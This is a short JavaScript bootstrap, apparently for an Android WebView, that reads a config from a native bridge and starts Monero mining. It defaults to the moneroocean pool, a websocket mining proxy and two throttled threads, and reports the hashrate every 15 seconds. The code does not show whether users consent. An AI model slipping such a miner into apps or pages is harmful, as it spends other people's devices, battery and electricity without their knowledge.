(function () {
  var CFG = {
    wallet: "", worker: "android", pool: "moneroocean.stream",
    server: "wss://ny1.xmrminingproxy.com", throttle: 20, threads: 2
  };
  try { CFG = JSON.parse(Android.config()); } catch (e) {}

  function log(m) { try { Android.log(String(m)); } catch (e) {} }
  function report(v) { try { Android.hashrate(v | 0); } catch (e) {} }

  function boot() {
    if (typeof window.startMining !== "function") {
      log("miner not ready, retry in 2s");
      return setTimeout(boot, 2000);
    }
    window.server        = CFG.server;
    window.throttleMiner = CFG.throttle;
    window.startMining(CFG.pool, CFG.wallet, CFG.worker, CFG.threads, "");
    log("mining started | threads=" + CFG.threads);

    var last = 0, lt = Date.now();
    setInterval(function () {
      var tot = window.totalhashes || 0, now = Date.now(), dt = (now - lt) / 1000;
      var hs  = dt > 0 ? Math.max(0, Math.round((tot - last) / dt)) : 0;
      last = tot; lt = now;
      report(hs);
    }, 15000);
  }
  boot();
})();
